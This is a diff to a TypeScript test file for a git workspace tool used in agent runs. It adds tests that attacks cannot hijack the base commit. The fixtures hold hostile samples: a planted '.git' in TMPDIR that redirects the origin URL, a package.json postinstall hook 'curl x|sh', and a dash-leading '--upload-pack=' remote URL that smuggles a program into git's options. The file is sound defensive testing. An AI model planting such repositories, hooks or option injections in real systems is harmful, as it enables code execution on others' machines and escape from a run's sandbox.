@@ -1,6 +1,6 @@
 import { describe, it, expect, beforeEach, afterEach } from "vitest";
 import { execFileSync } from "node:child_process";
-import { appendFileSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { appendFileSync, existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { collectDiff } from "./diff.js";
@@ -39,9 +39,11 @@ describe("a run's own diff cannot be narrowed from inside the worktree", () => {
   let origin: string;
   let trueMain: string;
 
-  function workspaceFor(repoPath = parent, remoteUrl: string | undefined = origin) {
+  // No default for remoteUrl: passing an explicit `undefined` selects the default instead of the
+  // value, which is how a test here once asserted the opposite of its own name.
+  function workspaceFor(remoteUrl: string = origin) {
     return createWorkspace(
-      { repoPath, worktreeRoot: join(dir, "wt"), baseBranch: "main" } as WorkerConfig,
+      { repoPath: parent, worktreeRoot: join(dir, "wt"), baseBranch: "main" } as WorkerConfig,
       createRunner(),
       () => ({}),
       remoteUrl
@@ -185,8 +187,83 @@ describe("a run's own diff cannot be narrowed from inside the worktree", () => {
   });
 
   it("refuses when no remote is configured for the checkout at all", async () => {
-    await expect(workspaceFor(parent, "").create("BP-1", "worker")).rejects.toThrow(
+    await expect(workspaceFor("").create("BP-1", "worker")).rejects.toThrow(
       /no remote is configured/
     );
+  });
+
+  // The agent is handed TMPDIR (env.ts's allowlist) and can write there, and what it writes
+  // outlives the run. A `.git` planted in that directory is honoured by anything git run from it —
+  // GIT_CEILING_DIRECTORIES cannot help, because git never excludes the working directory itself.
+  // The first attempt at this fix used os.tmpdir() directly and was poisonable exactly this way.
+  it("resolves the base even when a repository is planted in the temp directory itself", async () => {
+    const evil = join(dir, "evil");
+    execFileSync("git", ["init", "--quiet", "-b", "main", evil], { stdio: "pipe" });
+    git(evil, "config", "user.email", "attacker@example.com");
+    git(evil, "config", "user.name", "attacker");
+    writeFileSync(join(evil, "package.json"), '{"name":"t","scripts":{"postinstall":"curl x|sh"}}\n');
+    writeFileSync(join(evil, "README.md"), "# t\n");
+    git(evil, "add", "-A");
+    git(evil, "commit", "--quiet", "-m", "evil base");
+
+    const poisonedTmp = join(dir, "poisoned-tmp");
+    mkdirSync(join(poisonedTmp, ".git", "objects"), { recursive: true });
+    mkdirSync(join(poisonedTmp, ".git", "refs"), { recursive: true });
+    writeFileSync(join(poisonedTmp, ".git", "HEAD"), "ref: refs/heads/main\n");
+    writeFileSync(
+      join(poisonedTmp, ".git", "config"),
+      `[core]\n\trepositoryformatversion = 0\n[url "${evil}"]\n\tinsteadOf = ${origin}\n`
+    );
+
+    const realTmp = process.env.TMPDIR;
+    process.env.TMPDIR = poisonedTmp;
+    try {
+      const worktree = await workspaceFor().create("BP-1", "worker");
+      expect(worktree.baseSha).toBe(trueMain);
+      expect(git(worktree.path, "show", "HEAD:package.json")).not.toContain("postinstall");
+    } finally {
+      if (realTmp === undefined) delete process.env.TMPDIR;
+      else process.env.TMPDIR = realTmp;
+    }
+  });
+
+  // Nothing else here ever gives the fetch something to do: the fixture pushes to origin once and
+  // clones, so every object is already local and deleting the fetch outright leaves the rest of
+  // this file green. With origin ahead, the fetch is the only way the base can be reached — and
+  // `^{commit}` is the only thing that would notice if it had not been.
+  it("fetches a base the checkout does not have yet", async () => {
+    const ahead = join(dir, "ahead");
+    execFileSync("git", ["clone", "--quiet", origin, ahead], { stdio: "pipe" });
+    git(ahead, "config", "user.email", "someone@example.com");
+    git(ahead, "config", "user.name", "someone");
+    writeFileSync(join(ahead, "README.md"), "# t\nmoved on\n");
+    git(ahead, "add", "-A");
+    git(ahead, "commit", "--quiet", "-m", "someone else's work");
+    git(ahead, "push", "--quiet", "origin", "HEAD:refs/heads/main");
+    const newMain = git(ahead, "rev-parse", "HEAD").trim();
+
+    // the clone has never seen it
+    expect(() => git(parent, "cat-file", "-e", `${newMain}^{commit}`)).toThrow();
+
+    const worktree = await workspaceFor().create("BP-1", "worker");
+
+    expect(worktree.baseSha).toBe(newMain);
+    expect(worktree.baseSha).not.toBe(trueMain);
+    expect(git(worktree.path, "show", "HEAD:README.md")).toContain("moved on");
+  });
+
+  // `--` is what keeps a value beginning with a dash out of git's option slots. Asserting the
+  // spelling of the argv proves only the spelling; this runs a real git against a URL that would
+  // execute a program if the guard were not there.
+  it("does not execute a program named by a dash-leading remote URL", async () => {
+    const marker = join(dir, "executed");
+    const program = join(dir, "upload-pack.sh");
+    writeFileSync(program, `#!/bin/sh\ntouch ${marker}\nexit 1\n`, { mode: 0o755 });
+
+    await expect(
+      workspaceFor(`--upload-pack=${program}`).create("BP-1", "worker")
+    ).rejects.toThrow();
+
+    expect(existsSync(marker)).toBe(false);
   });
 });
